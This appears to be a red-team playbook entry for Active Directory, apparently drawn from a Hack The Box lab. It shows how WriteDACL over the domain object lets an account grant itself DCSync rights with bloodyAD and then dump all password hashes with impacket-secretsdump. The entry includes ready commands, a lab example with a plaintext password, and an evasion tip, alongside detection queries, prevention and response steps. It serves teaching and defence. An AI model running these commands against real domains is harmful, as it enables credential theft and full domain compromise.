name: WriteDACL to DCSync (bloodyAD, Linux)
description: With WriteDACL over the domain object (or a target), grant your own account the DS-Replication-Get-Changes / DS-Replication-Get-Changes-All rights, then DCSync to pull password hashes. bloodyAD's 'add dcsync' writes the ACE for you; secretsdump then replicates.
source: HTB Fluffy engagement; bloodyAD DACL abuse
notes:
=== THE IDEA ===
WriteDACL over the domain (or an object) lets you modify its ACL. Grant your account the
two replication rights (DS-Replication-Get-Changes + -Get-Changes-All) and you can DCSync
any principal - including krbtgt and Administrator.

=== bloodyAD ONE-LINER ===
  bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add dcsync <user>
  # adds the DCSync ACE for <user> on the domain head.

=== THEN DCSYNC ===
  impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc_ip>
  # or a single target:
  impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@<dc_ip>

=== CLEANUP ===
  bloodyAD ... remove dcsync <user>   # strip the ACE you added

=== WHY LOUD ===
Modifying the domain DACL and replicating hashes are both high-signal. Expect 4662/5136.
Remove the ACE afterward.

examples.label: Grant self DCSync via WriteDACL
examples.command: bloodyAD --host 10.129.65.243 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' add dcsync j.fleischman

recommended.note: WriteDACL is often reached via GenericAll/Owns on the domain object.

defense.why_it_works: WriteDACL over the domain object lets the attacker add an ACE granting themselves the directory replication rights; the DC then honors a replication (DCSync) request from that account and returns password hashes.
defense.prerequisites: WriteDACL (or Owns / WriteOwner then WriteDACL) over the domain head or a target object.
defense.impact: DCSync of any principal (krbtgt, Administrator) - full domain compromise.
defense.detection: [MITRE T1003.006] Event 5136 modifying nTSecurityDescriptor on the domain object; Event 4662 with the replication GUIDs (1131f6aa-... / 1131f6ad-...) from a non-DC account; correlate the DACL change with a subsequent replication.
defense.artifacts: 5136 on nTSecurityDescriptor of the domain; 4662 replication access by a user account; 4670 (permissions on an object were changed).
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136 AttributeLDAPDisplayName="nTSecurityDescriptor"
| table _time, SubjectUserName, ObjectDN, OperationType

index=wineventlog sourcetype="WinEventLog:Security" EventCode=4662 Properties="*1131f6aa*" OR Properties="*1131f6ad*"
| where Account_Name!="*$"
| table _time, Account_Name, ObjectName
defense.elastic_kql: event.code:"4662" AND winlog.event_data.Properties:(*1131f6aa* OR *1131f6ad*) AND not winlog.event_data.SubjectUserName:*$
defense.sentinel_kql:
SecurityEvent
| where EventID == 4662 and (Properties has "1131f6aa" or Properties has "1131f6ad")
| where SubjectUserName !endswith "$"
| project TimeGenerated, Actor=SubjectUserName, Object=ObjectName
| union (SecurityEvent | where EventID == 5136 and AttributeLDAPDisplayName == "nTSecurityDescriptor" | project TimeGenerated, Actor=SubjectUserName, Object=ObjectDN)
| sort by TimeGenerated desc
defense.prevention: Restrict WriteDACL/Owns on the domain object to Tier-0 admins; alert on 5136 changes to nTSecurityDescriptor on the domain head and on 4662 replication by non-DC accounts; baseline which principals legitimately replicate; treat any user-account DCSync as an incident.
defense.evasion: Grant, DCSync a single target, then remove the ACE quickly to shorten exposure; use an account that already looks privileged.
defense.misconfiguration: Non-Tier-0 principals hold WriteDACL / Owns / WriteOwner over the domain object, letting them self-grant replication rights.
defense.secure_config:
# Remove the excessive ACE on the domain object; restrict to Domain Admins / Tier-0.
# Alert on Event 4662 with replication GUIDs where the account is not a Domain Controller.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Windows Security Event Log for surrounding context (5 min before/after)
Check for credential dumping artifacts (LSASS access, SAM hive reads, Kerberos anomalies)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

interview.q: How does WriteDACL over the domain lead to DCSync?
interview.a: WriteDACL lets you modify the domain object's ACL, so you add an ACE granting your account DS-Replication-Get-Changes and -Get-Changes-All. With those rights you run DCSync (secretsdump) to replicate password hashes for any principal, including krbtgt and Administrator.

interview.q: What is the definitive detection for DCSync abuse?
interview.a: Event 4662 containing the replication extended-right GUIDs (1131f6aa-... and 1131f6ad-...) requested by an account that is not a Domain Controller, ideally correlated with a preceding 5136 change to the domain's nTSecurityDescriptor. Any non-DC replication is an incident.

explain:
Abuses WriteDACL over the domain object to grant yourself DCSync rights, then dump hashes:
  --host <dc_ip>            the Domain Controller
  -d <domain>              the domain
  -u <user> -p <password>  authenticate as the account holding WriteDACL
  add dcsync <user>        write the DS-Replication-Get-Changes(-All) ACEs onto <user>
With replication rights, run secretsdump.py to DCSync the domain (krbtgt, Administrator, all NT hashes); remove the ACE afterward to clean up.
